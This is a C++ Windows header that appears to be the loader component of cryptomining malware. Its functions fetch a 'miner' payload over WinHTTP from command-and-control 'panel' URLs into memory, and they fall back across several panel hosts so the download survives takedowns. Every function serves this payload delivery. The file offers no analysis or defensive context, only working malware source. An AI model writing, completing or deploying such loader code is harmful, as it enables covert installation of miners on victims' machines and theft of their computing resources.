// remote_miner_loader.h
#pragma once
#include <windows.h>
#include <winhttp.h>
#include <cstdint>
#include <string>
#include <vector>
#include <stdexcept>
#include <iostream>

// Download a file from a URL and return as byte array
bool DownloadMinerFromURL(const std::wstring& urlStr, BYTE*& payloadBuf, size_t& payloadSize) {
    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    
    wchar_t szHostName[256];
    wchar_t szUrlPath[1024];
    
    urlComp.lpszHostName = szHostName;
    urlComp.dwHostNameLength = sizeof(szHostName) / sizeof(wchar_t);
    urlComp.lpszUrlPath = szUrlPath;
    urlComp.dwUrlPathLength = sizeof(szUrlPath) / sizeof(wchar_t);
    
    if (!WinHttpCrackUrl(urlStr.c_str(), (DWORD)urlStr.length(), 0, &urlComp)) {
        std::wcerr << L"[-] Failed to parse URL: " << urlStr << std::endl;
        return false;
    }
    
    std::wcout << L"[*] Downloading from: " << szHostName << szUrlPath << std::endl;
    
    HINTERNET hSession = WinHttpOpen(L"CorvusMiner/1.0",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME,
                                      WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        std::cerr << "[-] WinHttpOpen failed" << std::endl;
        return false;
    }
    
    HINTERNET hConnect = WinHttpConnect(hSession, szHostName, urlComp.nPort, 0);
    if (!hConnect) {
        std::cerr << "[-] WinHttpConnect failed" << std::endl;
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", szUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            flags);
    if (!hRequest) {
        std::cerr << "[-] WinHttpOpenRequest failed" << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        std::cerr << "[-] WinHttpSendRequest failed" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        std::cerr << "[-] WinHttpReceiveResponse failed" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Check status code
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        NULL, &statusCode, &statusCodeSize, NULL);
    
    if (statusCode != 200) {
        std::cerr << "[-] HTTP error: " << statusCode << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Read response data
    std::vector<BYTE> buffer;
    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    
    do {
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) {
            std::cerr << "[-] WinHttpQueryDataAvailable failed" << std::endl;
            break;
        }
        
        if (bytesAvailable == 0)
            break;
        
        std::vector<BYTE> tempBuffer(bytesAvailable);
        if (!WinHttpReadData(hRequest, tempBuffer.data(), bytesAvailable, &bytesRead)) {
            std::cerr << "[-] WinHttpReadData failed" << std::endl;
            break;
        }
        
        buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + bytesRead);
    } while (bytesAvailable > 0);
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    if (buffer.empty()) {
        std::cerr << "[-] Downloaded data is empty" << std::endl;
        return false;
    }
    
    // Copy to output buffer
    payloadSize = buffer.size();
    payloadBuf = new BYTE[payloadSize];
    memcpy(payloadBuf, buffer.data(), payloadSize);
    
    std::wcout << L"[+] Downloaded " << payloadSize << L" bytes from " << urlStr << std::endl;
    return true;
}

// Try to download from a panel URL with resource path
bool DownloadMinerFromPanel(const std::string& panelUrl, const std::string& resourcePath, 
                             BYTE*& payloadBuf, size_t& payloadSize) {
    // Extract base URL (remove /api/miners/submit if present)
    std::string baseUrl = panelUrl;
    size_t submitPos = baseUrl.find("/api/miners/submit");
    if (submitPos != std::string::npos) {
        baseUrl = baseUrl.substr(0, submitPos);
    }
    
    // Construct full URL
    std::string fullUrl = baseUrl + resourcePath;
    
    // Convert to wstring
    std::wstring wUrl(fullUrl.begin(), fullUrl.end());
    
    return DownloadMinerFromURL(wUrl, payloadBuf, payloadSize);
}

// Try downloading from multiple panel URLs with fallback
bool DownloadMinerWithFallback(const std::string& panelUrls, const std::string& resourcePath,
                                BYTE*& payloadBuf, size_t& payloadSize) {
    // Split panel URLs by comma
    std::vector<std::string> urls;
    std::string current;
    for (char c : panelUrls) {
        if (c == ',') {
            if (!current.empty()) {
                // Trim whitespace
                size_t start = current.find_first_not_of(" \t\n\r");
                size_t end = current.find_last_not_of(" \t\n\r");
                if (start != std::string::npos && end != std::string::npos) {
                    urls.push_back(current.substr(start, end - start + 1));
                }
                current.clear();
            }
        } else {
            current += c;
        }
    }
    if (!current.empty()) {
        size_t start = current.find_first_not_of(" \t\n\r");
        size_t end = current.find_last_not_of(" \t\n\r");
        if (start != std::string::npos && end != std::string::npos) {
            urls.push_back(current.substr(start, end - start + 1));
        }
    }
    
    // Try each URL
    for (const auto& url : urls) {
        std::cout << "[*] Attempting download from: " << url << resourcePath << std::endl;
        if (DownloadMinerFromPanel(url, resourcePath, payloadBuf, payloadSize)) {
            std::cout << "[+] Successfully downloaded from: " << url << std::endl;
            return true;
        }
        std::cerr << "[-] Failed to download from: " << url << ", trying next..." << std::endl;
    }
    
    std::cerr << "[-] Failed to download from all panel URLs" << std::endl;
    return false;
}
